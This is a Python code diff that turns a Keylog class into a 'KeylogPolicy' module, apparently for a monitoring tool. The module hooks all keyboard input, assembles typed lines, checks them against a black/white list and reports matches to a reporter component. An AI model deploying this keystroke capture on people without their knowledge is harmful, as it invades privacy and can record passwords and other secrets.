@@ -1,8 +1,16 @@
+from keyboard import on_press, wait
+
 from lib.GlobalManager import gmget
+from lib.Policy import Policy
 
 
-class Keylog:
+class KeylogPolicy(Policy):
     line_typed = ""
+
+    def __init__(self):
+        super().__init__()
+        self.name = "KeylogPolicy"
+        self.active = False
 
     def callback(self, event):
         name = event.name
@@ -16,7 +24,12 @@ class Keylog:
                 name = ""
                 if gmget("bwlist").check(self.line_typed):
                     gmget("reporter").report(self.line_typed)
-
             self.line_typed += name
         else:
             self.line_typed += name
+
+    def _THR_FUNC(self):
+        # When key pressed
+        while self.active:
+            on_press(callback=self.callback)
+            wait()
